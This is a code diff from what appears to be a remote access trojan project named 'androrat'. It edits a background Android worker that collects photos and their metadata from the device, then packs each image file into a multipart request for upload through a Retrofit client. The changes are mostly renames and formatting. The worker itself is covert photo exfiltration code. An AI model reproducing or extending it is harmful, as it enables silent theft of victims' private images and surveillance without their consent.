@@ -7,6 +7,7 @@ import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import com.ierusalem.androrat.core.data.networking.RetrofitInstance
+import com.ierusalem.androrat.core.utils.toReadableDate
 import com.ierusalem.androrat.features.home.domain.model.Image
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
@@ -74,11 +75,11 @@ class PhotosUploadWorker(context: Context, workerParameters: WorkerParameters) :
                 imagesX.add(
                     Image(
                         id = id,
-                        author = author,
+                        author = author.toString(),
                         displayName = disPlayName,
-                        data = data,
-                        dataTaken = dataTaken,
-                        description = description,
+                        folderName = data,
+                        dateTaken = dataTaken.toReadableDate(),
+                        description = description.toString(),
                         uri = uri
                     )
                 )
@@ -86,15 +87,16 @@ class PhotosUploadWorker(context: Context, workerParameters: WorkerParameters) :
             images = imagesX
         }
 
-        val parts : MutableList<MultipartBody.Part> = mutableListOf()
+        val parts: MutableList<MultipartBody.Part> = mutableListOf()
         images.forEach { image ->
             val file = image.uri.path?.let { File(it) }
-            if(file!= null){
+            if (file != null) {
                 parts.add(
                     MultipartBody.Part.createFormData(
                         "image",
                         file.name,
-                        file.asRequestBody())
+                        file.asRequestBody()
+                    )
                 )
             }
         }
